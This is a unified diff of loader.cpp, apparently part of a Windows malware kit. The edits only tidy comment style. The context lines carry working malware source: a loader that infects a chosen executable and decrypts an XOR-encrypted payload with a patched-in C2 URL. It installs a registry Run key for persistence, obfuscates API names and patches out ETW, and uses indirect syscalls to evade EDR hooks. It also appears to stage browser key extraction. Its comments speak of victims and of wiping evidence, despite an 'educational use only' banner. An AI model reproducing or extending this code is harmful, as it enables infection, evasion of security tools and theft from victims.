@@ -1,4 +1,4 @@
-// loader.cpp - self-injecting payload loader for any .exe the attacker chooses.
+// loader.cpp -- self-injecting payload loader for any .exe the attacker chooses.
 //
 //   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING
 //
@@ -55,20 +55,20 @@
 #include <string.h>
 #include "payload.h"                 // g_payload_enc[], g_xor_key[16], g_payload_len
 
-// GUI subsystem: no console window when the victim double-clicks the infected exe
+// GUI subsystem: no console window when the victim double-clicks the infected exe.
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:wmainCRTStartup")
 
-// ------------------------------------------------------------------ sentinels (loader's own copies)
+// ------------------------------------------------------------------ Sentinels (loader's own copies)
 // auto.py/pick.py find these in loader.exe and overwrite with real values.
 // At runtime, DecryptPayload() copies these into the decrypted payload buffer.
 static char g_c2_url[256]  = "CKC2_DEADBEEF_";               // C2 URL (14-byte sentinel)
-static char g_persist[8]   = {'C','K','P','R','_','_','_','_'}; // persistence flag
-static char g_skip_av[8]   = {'C','K','A','V','0','0','0','0'}; // anti-VM skip flag
+static char g_persist[8]   = {'C','K','P','R','_','_','_','_'}; // Persistence flag
+static char g_skip_av[8]   = {'C','K','A','V','0','0','0','0'}; // Anti-VM skip flag
 
 #define STAGE_DIR L"C:\\ProgramData\\MediaCache"
 
-// ------------------------------------------------------------------ dynamic API resolution
+// ------------------------------------------------------------------ Dynamic API resolution
 // v13 no longer calls any remote-injection API, so the typedefs for
 // WriteProcessMemory/VirtualAllocEx/VirtualProtectEx/CreateRemoteThread/
 // NtUnmapViewOfSection are gone. The only names still obfuscated are the ones
@@ -86,7 +86,7 @@ template <size_t N> static FARPROC ProcObf(HMODULE m, const EncName<N>& e){
 }
 static constexpr EncName EN_ETW  {"EtwEventWrite"};
 
-// debug-only trace of every loader exit path -- production builds emit nothing
+// Debug-only trace of every loader exit path -- production builds emit nothing.
 #ifdef DEBUG
 static void LLog(const char* msg, DWORD err){
     CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
@@ -102,7 +102,7 @@ static void LLog(const char* msg, DWORD err){
 static void LLog(const char*, DWORD){}
 #endif
 
-// ------------------------------------------------------------------ persistence (loader-side)
+// ------------------------------------------------------------------ Persistence (loader-side)
 // Installs a registry Run key pointing at the hidden infected backup so the payload
 // re-runs on every login. Done HERE and not in the payload: the payload runs inside
 // this process and GetModuleFileName would report the loader's temp path. The backup
@@ -119,7 +119,7 @@ static void InstallRunKey(const wchar_t* exePath){
         (const BYTE*)exePath, (lstrlenW(exePath) + 1) * sizeof(wchar_t));
     RegCloseKey(hKey);
 }
-// true when the CKPR sentinel in THIS binary was patched to CKPR0001 by auto.py
+// True when the CKPR sentinel in THIS binary was patched to CKPR0001 by auto.py.
 static bool PersistEnabled(void){
     return g_persist[4]=='0' && g_persist[5]=='0' && g_persist[6]=='0' && g_persist[7]=='1';
 }
@@ -132,7 +132,7 @@ static PIMAGE_NT_HEADERS Nt(void* b){
 }
 static bool IsClr(void* b){ PIMAGE_NT_HEADERS n=Nt(b); return n && n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress!=0; }
 
-// Convert RVA (relative virtual address) to raw file offset
+// Convert RVA (relative virtual address) to raw file offset.
 static DWORD Rva2Off(PIMAGE_NT_HEADERS nt, DWORD rva){
     PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);
     for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sec++){
@@ -168,7 +168,7 @@ static bool EndsWithI(const wchar_t* s, const wchar_t* suffix){
     return lstrcmpiW(s+n-m,suffix)==0;
 }
 
-// true when path is dir itself or lives inside it
+// True when path is dir itself or lives inside it.
 static bool IsUnderDir(const wchar_t* path, const wchar_t* dir){
     size_t n=lstrlenW(dir);
     if(n==0 || _wcsnicmp(path,dir,n)!=0) return false;
@@ -189,7 +189,7 @@ static bool DirWritable(const wchar_t* dir){
     return true;
 }
 
-// LocalServer32 may be quoted and may carry -Embedding: keep the executable only
+// LocalServer32 may be quoted and may carry -Embedding: keep the executable only.
 static void ServerExePath(const wchar_t* raw, wchar_t* out){
     const wchar_t* p=raw;
     while(*p==L' '||*p==L'\t') p++;
@@ -471,9 +471,9 @@ static void StageOneKey(const KeyTarget& t, const char* b64, DWORD b64_len, bool
         KeyLog(t.name,"appb write failed",GetLastError());
         DeleteFileW(helper); return;
     }
-    DeleteFileW(key);                       // never accept a stale key
+    DeleteFileW(key);                       // Never accept a stale key
     bool ok=RunHelper(helper,appb,key,clsid);
-    DeleteFileW(helper);                    // the service is done with the path
+    DeleteFileW(helper);                    // The service is done with the path
     DeleteFileW(appb);
     if(!ok){ KeyLog(t.name,"service call failed",0); return; }
     HANDLE k=CreateFileW(key,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
@@ -486,7 +486,7 @@ static void StageOneKey(const KeyTarget& t, const char* b64, DWORD b64_len, bool
     KeyLog(t.name,"v20 key written",0);
 }
 
-// force (--keydebug) skips the writability probe and attempts the deploy anyway:
+// Force (--keydebug) skips the writability probe and attempts the deploy anyway:
 // the probe cannot see a redirected or virtualised store, and a failed create is
 // logged either way.
 static void RunKeyStage(bool force){
@@ -556,7 +556,7 @@ static void WipeFree(BYTE* buf){
     free(buf);
 }
 
-// ------------------------------------------------------------------ indirect syscalls
+// ------------------------------------------------------------------ Indirect syscalls
 // EDR products hook the ntdll Nt* prologues and inspect the caller. Calling the
 // kernel32 wrapper still ends in the hooked ntdll function. Issuing the syscall
 // ourselves from a private stub bypasses the prologue; jumping to a `syscall;
@@ -582,9 +582,9 @@ static DWORD StubSsn(BYTE* p, int depth){
     if(!p || depth>4) return 0;
     if(p[0]==0x4C && p[1]==0x8B && p[2]==0xD1 && p[3]==0xB8)
         return *(DWORD*)(p+4);
-    if(p[0]==0xB8)                       // pre-Win10 layout: mov eax, SSN at entry
+    if(p[0]==0xB8)                       // Pre-Win10 layout: mov eax, SSN at entry
         return *(DWORD*)(p+1);
-    if(p[0]==0xE9){                      // inline hook: follow the rel32 once
+    if(p[0]==0xE9){                      // Inline hook: follow the rel32 once
         BYTE* t=p+5+(*(INT32*)(p+1));
         return StubSsn(t,depth+1);
     }
@@ -603,7 +603,7 @@ static BYTE* SyscallGadget(BYTE* base, PIMAGE_NT_HEADERS nt){
     return NULL;
 }
 
-// mov r10, rcx; mov eax, ssn; mov r11, gadget; jmp r11
+// mov r10, rcx; mov eax, ssn; mov r11, gadget; jmp r11.
 static void MakeStub(BYTE* mem, DWORD ssn, BYTE* gadget){
     BYTE* p=mem;
     *p++=0x4C; *p++=0x8B; *p++=0xD1;
@@ -657,7 +657,7 @@ static PVOID AllocImage(PVOID prefer, SIZE_T size){
         LONG st=g_NtAlloc((HANDLE)-1,&at,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
         if(st>=0 && at) return at;
         if(!prefer) return NULL;
-        at=NULL; sz=size;                  // preferred base taken: relocate, retry anywhere
+        at=NULL; sz=size;                  // Preferred base taken: relocate, retry anywhere
         st=g_NtAlloc((HANDLE)-1,&at,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
         return (st>=0 && at) ? at : NULL;
     }
@@ -793,7 +793,7 @@ static bool SealImage(BYTE* base, PIMAGE_NT_HEADERS nt){
     }
     DWORD hdr=nt->OptionalHeader.SizeOfHeaders;
     memset(base,0,hdr);
-    ProtectSelf(base,hdr,PAGE_READONLY);   // best effort: stays RW if the call fails
+    ProtectSelf(base,hdr,PAGE_READONLY);   // Best effort: stays RW if the call fails
     FlushInstructionCache(GetCurrentProcess(),base,nt->OptionalHeader.SizeOfImage);
     return true;
 }
@@ -835,15 +835,15 @@ int wmain(int argc,wchar_t** argv){
 #ifdef DEBUG
     bool keystage_only=false;
 #endif
-    static wchar_t target_buf[MAX_PATH];               // buffer for standalone mode
+    static wchar_t target_buf[MAX_PATH];               // Buffer for standalone mode
     for(int i=1;i<argc;i++){
         if(!lstrcmpW(argv[i],L"-p")&&i+1<argc) target=argv[++i];
         else if(!lstrcmpW(argv[i],L"--purge")) purge=true;
         // v13: the payload shares this process, so there is no host to terminate.
         // --kill stays parseable for pick.py/auto.py compatibility and does nothing.
         else if(!lstrcmpW(argv[i],L"--kill")){}
-        // skip the writability probe and attempt the deploy anyway (bench hook:
-        // a redirected or virtualised store lies to CreateFile)
+        // Skip the writability probe and attempt the deploy anyway (bench hook:
+        // a redirected or virtualised store lies to CreateFile).
         else if(!lstrcmpW(argv[i],L"--keydebug")) keydebug=true;
 #ifdef DEBUG
         else if(!lstrcmpW(argv[i],L"--keystage-only")) keystage_only=true;
@@ -876,7 +876,7 @@ int wmain(int argc,wchar_t** argv){
                                        ReadAllBytes(hs,hbuf,host_len);
                         CloseHandle(hs); hs=INVALID_HANDLE_VALUE;
 
-                        // Directory of the infected .exe
+                        // Directory of the infected .exe.
                         wchar_t wdir[MAX_PATH]; lstrcpyW(wdir,self);
                         wchar_t* s2=wdir+lstrlenW(wdir);
                         while(s2>wdir && s2[-1]!=L'\\') s2--;
@@ -908,7 +908,7 @@ int wmain(int argc,wchar_t** argv){
                                 }
                             } else {
                                 SetFileAttributesW(clean,FILE_ATTRIBUTE_HIDDEN);
-                                found=true;           // run the complete staged copy instead
+                                found=true;           // Run the complete staged copy instead
                             }
                         }
                         VirtualFree(hbuf,0,MEM_RELEASE);
@@ -923,7 +923,7 @@ int wmain(int argc,wchar_t** argv){
                                            CREATE_DEFAULT_ERROR_MODE,NULL,wdir,&si2,&pi2);
                             if(!hp){
 #ifdef DEBUG
-                                // debug-only: never write a trace file on a production victim
+                                // debug-only: never write a trace file on a production victim.
                                 CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
                                 HANDLE el=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",
                                     GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
@@ -940,17 +940,17 @@ int wmain(int argc,wchar_t** argv){
 
                             // 3b. Clean up the temp file -- unless persistence is enabled:
                             // then register the hidden copy in Run and keep it as the
-                            // payload carrier (the main exe is now the clean host)
+                            // payload carrier (the main exe is now the clean host).
                             bool persist_here = PersistEnabled();
                             if(renamed){
                                 if(persist_here){
-                                    InstallRunKey(bak);      // keep the backup as payload carrier
+                                    InstallRunKey(bak);      // Keep the backup as payload carrier
                                 } else if(!DeleteFileW(bak)){
                                     MoveFileExW(bak,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
                                 }
                             } else {
                                 if(persist_here){
-                                    InstallRunKey(origName); // rename failed: original is still infected
+                                    InstallRunKey(origName); // Rename failed: original is still infected
                                 } else if(!DeleteFileW(runExe)){
                                     MoveFileExW(runExe,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
                                 }
@@ -961,9 +961,9 @@ int wmain(int argc,wchar_t** argv){
                             //    target); the clean host runs as its own process.
                             lstrcpynW(target_buf,runExe,MAX_PATH);
                             target=target_buf;
-                            // extraction + hijack + every browser on a slow disk measured
+                            // Extraction + hijack + every browser on a slow disk measured
                             // ~3 min. wait stays 0 (no cap) unless -t was passed.
-                            // falls through to self-injection below
+                            // Falls through to self-injection below.
                         }
                     }
                 }
@@ -984,7 +984,7 @@ int wmain(int argc,wchar_t** argv){
     //    files exist when ckdll walks the stores.
     RunKeyStage(keydebug);
 #ifdef DEBUG
-    if(keystage_only) return 0;             // bench hook, compiled out of release
+    if(keystage_only) return 0;             // Bench hook, compiled out of release
 #endif
 
     // 3. Decrypt the XOR-encrypted payload and patch sentinels
@@ -1020,7 +1020,7 @@ int wmain(int argc,wchar_t** argv){
         if(th) LLog("thread: CreateThread fallback",0);
     }
     if(!th){ LLog("payload thread create failed",GetLastError()); WipeFree(g_payload); return 5; }
-    WipeFree(g_payload);                    // image is mapped; the staging copy is evidence
+    WipeFree(g_payload);                    // Image is mapped; the staging copy is evidence
 
     // 6. This process IS the payload host. Wait for the payload thread to finish
     //    (or the -t budget), then exit: there is no remote process to terminate.
